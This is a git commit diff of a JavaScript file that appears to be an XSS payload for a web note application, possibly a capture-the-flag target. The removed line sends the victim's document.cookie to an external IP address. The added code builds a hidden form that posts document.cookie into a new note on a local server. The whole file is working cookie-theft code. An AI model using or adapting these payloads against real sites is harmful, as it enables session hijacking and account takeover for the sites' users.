8b3b95230b9853e36e29c90012cfb0b50bd3d2fb
Frank <frank.migliorino@outlook.com>
2022-02-05 01:09:25 -0500

    aaa

--- index.js
+++ index.js
@@ -1,1 +1,32 @@
-$.get("http://35.171.27.77/y/" + document.cookie)
+/**
+ * sends a request to the specified url from a form. this will change the window location.
+ * @param {string} path the path to send the post request to
+ * @param {object} params the parameters to add to the url
+ * @param {string} [method=post] the method to use on the form
+ */
+
+ function post(path, params, method='post') {
+
+    // The rest of this code assumes you are not using a library.
+    // It can be made less verbose if you use one.
+    const form = document.createElement('form');
+    form.method = method;
+    form.action = path;
+  
+    for (const key in params) {
+      if (params.hasOwnProperty(key)) {
+        const hiddenField = document.createElement('input');
+        hiddenField.type = 'hidden';
+        hiddenField.name = key;
+        hiddenField.value = params[key];
+  
+        form.appendChild(hiddenField);
+      }
+    }
+  
+    document.body.appendChild(form);
+    form.submit();
+  }
+  
+
+post("http://127.0.0.1:5000/note/new", {"title": "AAAA", "content": document.cookie});
